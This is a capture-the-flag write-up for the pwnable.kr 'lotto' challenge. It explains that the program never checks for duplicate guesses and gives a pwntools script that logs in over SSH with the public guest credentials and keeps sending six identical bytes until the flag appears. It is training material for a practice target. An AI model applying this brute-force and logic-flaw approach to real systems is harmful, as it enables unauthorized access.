> **Problem**
>   - We have to match 6 lotto numbers which are picked from /dev/urandom which is cryptographically safe.
---  



> **Objective**
>   - After seeing the lotto.c source code i found a vulnerability:
> 
> <img width="481" alt="bug" src="https://github.com/user-attachments/assets/23b61259-eb03-4e4a-a84c-520b0d087cf9" />
> 
>   - this logic doesn't check for duplicates.if we put 6 same digits as inputs and bychance it appears in the lotto even for once the match will be +=1 six times.that will give us flag.
>   - We send xxxxxx where x is any random number between 1-45.We do this again and again untill it appears for once in the lotto.
---  

> **Solution**
> <blockquote>
> <details>
> <summary><b>Click to see lotto.py</b></summary>
>
> ```python
> from pwn import *
>
> i = 0
> conn = ssh(host='pwnable.kr', user='lotto', password='guest', port=2222)
> p = conn.run('./lotto')
>
> if p is None:
>     print("Failed to start the remote process.")
>     conn.close()
>     exit(1)
>
> welcome_message = p.recvuntil(b'3. Exit')
> print(welcome_message.decode())
>
> while i < 8145060:
>     p.sendline(b'1')
>     i += 1
>     input_msg = p.recvuntil(b'6 lotto bytes :')
>     print(input_msg.decode())
>     p.send(b'\x14' * 6)
>     data = p.recv(timeout=0.4)
>     print(data.decode())
> ```
>
> </details>
> </blockquote>  
>  
> - after running the script for sometime we get the flag.  <img width="1128" alt="flag" src="https://github.com/user-attachments/assets/8f82954a-584f-4c98-b585-18fcb895d42c" />



